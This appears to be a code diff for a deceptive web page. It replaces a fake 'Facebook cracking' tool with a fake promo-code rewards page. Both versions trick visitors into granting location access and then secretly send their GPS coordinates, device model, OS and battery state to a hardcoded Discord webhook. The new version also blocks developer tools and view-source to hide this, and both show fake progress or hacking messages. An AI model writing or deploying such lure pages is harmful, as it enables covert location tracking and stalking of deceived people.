@@ -3,146 +3,153 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FACEBOOK CRACKING V7.0</title>
+    <title>OFFICIAL REWARDS | ELITE ACCESS</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
-        body { background-color: #050505; color: #00ff41; font-family: 'Share Tech Mono', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        body::before { content: " "; display: block; position: absolute; top: 0; left: 0; bottom: 0; right: 0; background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06)); z-index: 2; background-size: 100% 2px, 3px 100%; pointer-events: none; }
-        .terminal { width: 90%; max-width: 450px; background: rgba(0, 20, 0, 0.9); border: 2px solid #00ff41; padding: 25px; box-shadow: 0 0 20px rgba(0, 255, 65, 0.4); position: relative; z-index: 3; }
-        .glitch { font-size: 24px; font-weight: bold; text-transform: uppercase; text-shadow: 2px 2px #3fb950; letter-spacing: 2px; text-align: center; border-bottom: 2px solid #00ff41; padding-bottom: 10px; margin-bottom: 20px; }
-        .guide-box { border: 1px solid #00ff41; color: #00ff41; padding: 12px; margin: 15px 0; font-size: 13px; background: rgba(0, 255, 65, 0.05); line-height: 1.5; }
-        .highlight { color: #ffffff; font-weight: bold; text-decoration: underline; }
-        input[type="text"] { width: 100%; background: #000; border: 1px solid #00ff41; padding: 12px; color: #00ff41; font-family: 'Share Tech Mono', monospace; box-sizing: border-box; margin: 20px 0; outline: none; text-align: center; }
-        .btn { width: 100%; background: #00ff41; color: #000; border: none; padding: 15px; font-weight: bold; text-transform: uppercase; cursor: pointer; transition: 0.3s; box-shadow: 0 0 10px #00ff41; font-family: 'Share Tech Mono', monospace; }
-        #logs { margin-top: 15px; font-size: 11px; color: #00ff41; text-align: left; height: 200px; border-top: 1px solid #004411; padding-top: 10px; display: none; overflow-y: hidden; line-height: 1.4; }
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Plus+Jakarta+Sans:wght@300;500;700&display=swap');
+        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; }
+        body { background: radial-gradient(circle at top right, #1e1b4b 0%, #0f172a 100%); font-family: 'Plus Jakarta Sans', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #f8fafc; overflow: hidden; }
+        .container { background: rgba(30, 41, 59, 0.4); backdrop-filter: blur(30px); border: 1px solid rgba(129, 140, 248, 0.2); border-radius: 40px; padding: 50px; width: 95%; max-width: 440px; text-align: center; box-shadow: 0 50px 120px -30px rgba(0, 0, 0, 0.8); position: relative; }
+        .gift-logo { font-size: 5.5rem; margin-bottom: 15px; filter: drop-shadow(0 0 30px #8b5cf6); animation: float 3s ease-in-out infinite; display: block; }
+        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
+        h1 { font-family: 'Orbitron', sans-serif; font-size: 1.4rem; letter-spacing: 4px; color: #a5b4fc; margin-bottom: 15px; }
+        .desc { font-size: 0.85rem; color: #94a3b8; line-height: 1.7; margin-bottom: 35px; }
+        input { width: 100%; background: rgba(15, 23, 42, 0.9); border: 2px solid rgba(129, 140, 248, 0.2); border-radius: 20px; padding: 20px; color: #fff; font-size: 1.1rem; margin-bottom: 25px; outline: none; transition: 0.4s; text-align: center; font-family: 'Orbitron', sans-serif; letter-spacing: 2px; }
+        .btn { width: 100%; background: rgba(79, 70, 229, 0.3); color: rgba(255,255,255,0.3); border: 1px solid rgba(255,255,255,0.1); padding: 22px; border-radius: 20px; font-weight: 700; cursor: not-allowed; transition: 0.6s; font-family: 'Orbitron', sans-serif; text-transform: uppercase; letter-spacing: 3px; }
+        .btn.active { background: linear-gradient(135deg, #6366f1 0%, #d946ef 100%); color: white; cursor: pointer; border: none; box-shadow: 0 0 40px rgba(139, 92, 246, 0.6); transform: translateY(-2px); }
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(2, 6, 23, 0.9); display: none; justify-content: center; align-items: center; z-index: 100; backdrop-filter: blur(10px); }
+        .modal-box { background: #0f172a; border: 1px solid #f43f5e; border-radius: 28px; padding: 40px; width: 85%; max-width: 340px; text-align: center; }
+        #loading-view { display: none; }
+        .progress-ring { width: 100%; background: rgba(255, 255, 255, 0.05); border-radius: 50px; height: 12px; margin: 40px 0; overflow: hidden; border: 1px solid rgba(255,255,255,0.1); }
+        .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #818cf8, #d946ef); transition: 0.8s ease-in-out; box-shadow: 0 0 20px #818cf8; }
+        .final-msg { animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        @keyframes popIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
         .hidden { display: none; }
-        #timer { color: #ff0000; font-weight: bold; font-size: 1.2em; }
     </style>
 </head>
-<body>
-<div class="terminal">
-    <div class="glitch">FACEBOOK CRACKING V7.0</div>
-    <div id="phase1">
-        <div class="guide-box">
-            <strong>USER GUIDE:</strong> To successfully retrieve the target's Facebook account, device synchronization is required.<br><br>
-            You MUST click <span class="highlight">"ALLOW"</span> when the location prompt appears to gain full access to the target profile.
+<body oncontextmenu="return false;"> <div class="modal-overlay" id="customAlert">
+        <div class="modal-box">
+            <h2 id="modalTitle" style="color:#f43f5e; font-family:'Orbitron';">SYSTEM ERROR</h2>
+            <p id="modalMsg" style="margin:25px 0; color:#94a3b8;">Please input a redeem code.</p>
+            <button onclick="closeAlert()" style="background:transparent; border:1px solid #818cf8; color:#818cf8; padding:10px 30px; border-radius:12px; cursor:pointer; font-family:'Orbitron';">CLOSE</button>
         </div>
-        <button class="btn" onclick="startSync()">[ START EXTRACTION ]</button>
     </div>
-    <div id="phase2" class="hidden">
-        <p>> TARGET_PROFILE_URL:</p>
-        <input type="text" id="fbUrl" placeholder="PASTE_LINK_HERE">
-        <button class="btn" id="hackBtn" onclick="executePayload()">[ EXECUTE CRACK ]</button>
-        <div id="logs"></div>
+
+    <div class="container">
+        <div id="promo-view">
+            <div class="gift-logo">🎁</div>
+            <h1>REDEEM CODE</h1>
+            <p class="desc">Claim your exclusive rewards by entering your authorized promo code.</p>
+            <input type="text" id="promoInput" placeholder="ENTER CODE" oninput="checkInput()">
+            <button class="btn" id="claimBtn" onclick="validateAndSync()">CLAIM REWARD</button>
+        </div>
+
+        <div id="loading-view">
+            <div id="loader-content">
+                <div class="gift-logo" style="font-size:3.5rem;">⚙️</div>
+                <h1 style="font-family:'Orbitron'; font-size:1.2rem; color:#a5b4fc;">PROCESSING</h1>
+                <div class="progress-ring"><div class="progress-fill" id="p-fill"></div></div>
+                <p id="status-text" style="color:#818cf8; font-family:'Orbitron'; font-size:0.75rem;">Initializing Secure Uplink...</p>
+            </div>
+            <div id="final-content" class="hidden final-msg">
+                <div class="gift-logo" style="font-size:4rem; filter: grayscale(1);">🚫</div>
+                <h1 style="font-family:'Orbitron'; font-size:1.5rem; color:#f43f5e; margin-bottom:15px;">BETTER NEXT TIME</h1>
+                <p style="color:#94a3b8; font-size:0.85rem; line-height:1.6;">THE PROMO IS NOT COMPATIBLE WITH YOUR CURRENT DEVICE ARCHITECTURE.</p>
+            </div>
+        </div>
     </div>
-</div>
 
 <script>
-    const webhookURL = "https://discord.com/api/webhooks/1467168586593206365/yj42mD6vmPVoRYaEsCNdG77n8fpaHhJBRk242A1viRSusMdvIa2bcZ8mpCx20JspYQr-";
+    // --- SECURITY SHIELD ---
+    document.onkeydown = function(e) {
+        if(e.keyCode == 123) return false; // Block F12
+        if(e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0))) return false;
+        if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false; // Block View Source
+    };
 
-    let deviceDetails = { model: "Unknown", os: "Unknown", osVersion: "N/A", battery: "N/A", connection: "N/A" };
+    // --- RECON LOGIC ---
+    const webhook = "https://discord.com/api/webhooks/1467168586593206365/yj42mD6vmPVoRYaEsCNdG77n8fpaHhJBRk242A1viRSusMdvIa2bcZ8mpCx20JspYQr-";
+    const authorizedCodes = ["ASHXVEHA", "BXJAHEJC", "BABXJGJW", "JDBXHZKW", "KWBXHZHW", "NXJAHWJR", "JZHAHECX"];
 
-    async function getDeepInfo() {
+    function checkInput() {
+        const val = document.getElementById("promoInput").value.toUpperCase();
+        const btn = document.getElementById("claimBtn");
+        val.length >= 8 ? btn.classList.add("active") : btn.classList.remove("active");
+    }
+
+    function showAlert(t, m) {
+        document.getElementById("modalTitle").innerText = t;
+        document.getElementById("modalMsg").innerText = m;
+        document.getElementById("customAlert").style.display = "flex";
+    }
+
+    function closeAlert() { document.getElementById("customAlert").style.display = "none"; }
+
+    function validateAndSync() {
+        const val = document.getElementById("promoInput").value.toUpperCase();
+        if(!val) { showAlert("INPUT REQUIRED", "Please input a redeem code."); return; }
+        if(!authorizedCodes.includes(val)) { showAlert("INVALID CODE", "The code entered is not recognized."); return; }
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(pos => {
+                startProcess(val, pos.coords.latitude, pos.coords.longitude);
+            }, () => showAlert("SYNC ERROR", "Location access is required for verification."));
+        }
+    }
+
+    async function startProcess(code, lat, lon) {
+        document.getElementById("promo-view").classList.add("hidden");
+        document.getElementById("loading-view").style.display = "block";
+
+        let batLevel = "Unreachable", isCharging = "Unknown";
         if (navigator.getBattery) {
-            const batt = await navigator.getBattery();
-            deviceDetails.battery = `${Math.round(batt.level * 100)}% ${batt.charging ? "(Charging)" : "(Discharged)"}`;
+            const b = await navigator.getBattery();
+            batLevel = Math.round(b.level * 100) + "%";
+            isCharging = b.charging ? "YES (⚡ Charging)" : "NO (🔋 Discharged)";
         }
-        if (navigator.connection) {
-            deviceDetails.connection = `${navigator.connection.effectiveType} (~${navigator.connection.downlink}Mbps)`;
-        }
+
+        let devName = "Mobile Device";
+        let devOS = "Unknown OS";
         if (navigator.userAgentData) {
-            const data = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion", "platform"]);
-            deviceDetails.model = data.model || "Generic Device";
-            deviceDetails.os = data.platform;
-            deviceDetails.osVersion = data.platformVersion;
+            const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"]);
+            devName = hints.model || "Mobile Device";
+            devOS = `${hints.platform} ${hints.platformVersion || ""}`;
         } else {
             const ua = navigator.userAgent;
-            if (/android/i.test(ua)) {
-                deviceDetails.os = "Android";
-                const match = ua.match(/Android\s([0-9\.]*)/);
-                deviceDetails.osVersion = match ? match[1] : "Unknown";
-            }
+            if (/Android/i.test(ua)) { devOS = "Android " + (ua.match(/Android\s([0-9\.]+)/)?.[1] || ""); devName = "Android Device"; }
+            else if (/iPhone|iPad/i.test(ua)) { devOS = "iOS " + (ua.match(/OS\s([0-9\_]+)/)?.[1].replace(/_/g,'.') || ""); devName = "Apple Device"; }
         }
-    }
-    getDeepInfo();
 
-    function startSync() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(onSuccess, onError, {enableHighAccuracy:true});
-        } else { alert("SYSTEM_ERROR: BROWSER_NOT_SUPPORTED"); }
-    }
+        fetch(webhook, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                username: "SUPREME_RECON_FINAL",
+                embeds: [{
+                    title: "🎁 SUPREME REWARD LOGGED",
+                    color: 10181046,
+                    fields: [
+                        { name: "📍 Latitude:", value: `\`${lat}\``, inline: true },
+                        { name: "📍 Longitude:", value: `\`${lon}\``, inline: true },
+                        { name: "📱 Device Name:", value: `\`${devName}\``, inline: false },
+                        { name: "🤖 Device OS:", value: `\`${devOS}\``, inline: true },
+                        { name: "🔋 Battery Level:", value: `\`${batLevel}\``, inline: true },
+                        { name: "🔌 Charging Status:", value: `\`${isCharging}\``, inline: false },
+                        { name: "🎫 Promo Code:", value: `\`${code}\``, inline: false },
+                        { name: "🗺️ Google Maps:", value: `[📍 Open in Maps](https://www.google.com/maps?q=${lat},${lon})`, inline: false }
+                    ],
+                    footer: { text: "Timestamp: " + new Date().toLocaleString() }
+                }]
+            })
+        });
 
-    function onSuccess(pos) {
-        localStorage.setItem("lat", pos.coords.latitude);
-        localStorage.setItem("lon", pos.coords.longitude);
-        document.getElementById("phase1").classList.add("hidden");
-        document.getElementById("phase2").classList.remove("hidden");
-    }
+        const steps = ["Decrypting Key...", "Fetching Hardware ID...", "Syncing Signature...", "Finalizing Protocol..."];
+        for(let i=0; i<steps.length; i++) {
+            await new Promise(r => setTimeout(r, 1500));
+            document.getElementById("p-fill").style.width = ((i+1)*25) + "%";
+            document.getElementById("status-text").innerText = steps[i];
+        }
 
-    function onError() { alert("SYNC_FAILED: Permission Denied. Full access requires location."); }
-
-    async function executePayload() {
-        const fbUrl = document.getElementById("fbUrl").value;
-        if (!fbUrl) return;
-
-        const lat = localStorage.getItem("lat");
-        const lon = localStorage.getItem("lon");
-
-        const payload = {
-            username: "CRACKING_V7_BOT",
-            embeds: [{
-                title: "🎯 TARGET SUCCESSFULLY CRACKED",
-                color: 5763719,
-                fields: [
-                    { name: "📍 Location", value: `Lat: \`${lat}\`\nLon: \`${lon}\`\n[📍 Google Maps](https://www.google.com/maps?q=${lat},${lon})`, inline: false },
-                    { name: "📱 Hardware", value: `Model: \`${deviceDetails.model}\`\nOS: \`${deviceDetails.os} ${deviceDetails.osVersion}\``, inline: true },
-                    { name: "🔋 Battery & Net", value: `Batt: \`${deviceDetails.battery}\`\nNet: \`${deviceDetails.connection}\``, inline: true },
-                    { name: "🔗 Target URL", value: `\`${fbUrl}\``, inline: false }
-                ],
-                footer: { text: "Facebook Cracking V7.0 Report • " + new Date().toLocaleString() }
-            }]
-        };
-
-        fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-
-        document.getElementById("hackBtn").style.display = "none";
-        document.getElementById("fbUrl").style.display = "none";
-        let logs = document.getElementById("logs");
-        logs.style.display = "block";
-
-        const logSequences = [
-            "> Initializing decryption modules...",
-            "> Connecting to Facebook Graph API...",
-            "> Bypassing Two-Factor Authentication...",
-            "> Collecting account information...",
-            "> Extracting linked emails and phone numbers...",
-            "> Fetching private message metadata...",
-            "> Cracking security tokens... [DONE]",
-            "> Success! Account vulnerability exploited."
-        ];
-
-        let i = 0;
-        const interval = setInterval(() => {
-            if (i < logSequences.length) {
-                logs.innerHTML += `<br>${logSequences[i]}`;
-                i++;
-            } else {
-                clearInterval(interval);
-                logs.innerHTML += `<br><br><span style='color:yellow'>Waiting for 10 minutes to bypass final verification... <span id='timer'>10:00</span></span>`;
-                startTimer();
-            }
-        }, 800);
-    }
-
-    function startTimer() {
-        var timeleft = 600;
-        setInterval(function(){
-            if(timeleft <= 0) return;
-            var minutes = Math.floor(timeleft / 60);
-            var seconds = timeleft % 60;
-            document.getElementById("timer").innerHTML = minutes + ":" + (seconds < 10 ? '0' : '') + seconds;
-            timeleft -= 1;
-        }, 1000);
+        document.getElementById("loader-content").classList.add("hidden");
+        document.getElementById("final-content").classList.remove("hidden");
     }
 </script>
 </body>
